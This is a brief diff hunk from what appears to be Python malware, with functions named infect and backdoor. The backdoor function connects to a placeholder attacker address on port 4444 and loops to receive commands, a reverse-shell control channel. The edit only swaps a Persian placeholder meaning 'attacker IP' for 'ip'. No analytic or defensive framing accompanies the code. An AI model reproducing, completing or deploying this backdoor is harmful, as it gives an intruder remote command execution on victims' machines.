@@ -51,7 +51,7 @@ def infect(files_to_infect):
 
 def backdoor():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('مهاجم_آی‌پی', 4444))  
+    s.connect(('ip', 4444))  
     while True:
         command = s.recv(1024).decode()
         if command.lower() == 'exit':
